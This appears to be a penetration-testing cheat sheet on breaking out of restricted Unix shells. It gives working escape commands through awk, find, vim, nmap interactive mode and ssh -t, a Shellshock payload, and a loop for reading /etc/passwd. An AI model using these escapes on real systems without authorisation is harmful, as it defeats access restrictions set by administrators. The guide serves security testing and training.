# Restricted Shell (rbash, rzsh) Bypass

The restricted shell is a Unix shell that restricts some of the capabilities available to an interactive user session.

After logged in a shell, sometimes we faced the error such as below when executing commands.

```shellscript
-rbash: cd: restricted
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
```

The target system uses a **restricted shell** so we may not be able to execute commonly used commands e.g. `ls`, `cd`, etc.\
We need to bypass the restriction First.

### Command Enumeration <a href="#command-enumeration" id="command-enumeration"></a>

First check what commands can we execute.\
Try running varied commands.

```shellscript
awk 'BEGIN {system("/bin/sh")}'
bash
cat
cd
cp
declare
echo
echo $PATH
echo $SHELL
echo /usr/bin/*
echo /home/<username>/bin/*
echo "bash -i" | tee rbypass.sh
env
export
find
find / -name foobar -exec /bin/sh \;
ftp
git
less
ls
nano
nmap
printenv
printf
# List all files in current directory
printf '%s\n' *(D)
pwd
set
sudo
sudo -l
tar
touch
vi
vim
whereis
which
whoami
zip

# Programming languages
perl
php
python
python2
python3
python3.x
ruby

# Commands with absolute path
/bin/bash
/bin/sh
/usr/bin/cat
/usr/bin/ls


# Special characters
>
>>
<
|
&
$
$(whoami)
;
:
'
"
`
```

### How to Bypass <a href="#how-to-bypass" id="how-to-bypass"></a>

#### Update Environment Variables <a href="#update-environment-variables" id="update-environment-variables"></a>

If we can execute `export` command and the desired environment variable (**PATH, SHELL**, etc.) is not readonly, we can update variables.

```
export SHELL=/bin/bash
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

#### Autocomplete to List Directories <a href="#autocomplete-to-list-directories" id="autocomplete-to-list-directories"></a>

We can see files and directories in the current directory by inputting the following path and entering **“Tab”** key.

```
./.
```

#### Copy Shell Command <a href="#copy-shell-command" id="copy-shell-command"></a>

If we can execute `cp` command, we can copy `/bin/bash` or `/bin/sh` to the current directory.

```shellscript
cp /bin/bash .
cp /bin/sh .
```

#### List/Read Files <a href="#listread-files" id="listread-files"></a>

If we can use `echo` or `printf` command, we can list all files or read files.

1. **List**

```shellscript
# List all files
echo /*
echo /.* # list hidden files
echo /home/<username>/*
echo /home/<username>/.* # list hidden files

# List all files in current directory
printf '%s\n' *(D)
```

1. **Read**

```
while read line; do echo $line; done < /etc/passwd; echo $line
```

#### Nmap <a href="#nmap" id="nmap"></a>

If we can use nmap command, we can escape the restricted shell with the interactive mode.

```shellscript
nmap --interactive
nmap> !sh
```

#### Vi/Vim Editor <a href="#vivim-editor" id="vivim-editor"></a>

If we can use `vi` or `vim` command, we can update the SHELL variable in the vi/vim editor.

```shellscript
vim # or vi

# In vi/vim editor
:set shell=/bin/bash
:shell
```

#### SSH Flags <a href="#ssh-flags" id="ssh-flags"></a>

```shellscript
# -t: Force pseudo-terminal allocation
ssh <user>@<ip> -t "/bin/bash"
ssh <user>@<ip> -t "/bin/sh"
ssh <user>@<ip> -t "bash --noprofile"
# Shellshock
ssh <user>@<ip> "() {:;}; /bin/bash"
```

If we can enter the shell, run tab-completion by pushing **“Tab”** key.\
We may be able to retrieve commands available.

### References <a href="#references" id="references"></a>

* [Exploit DB](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
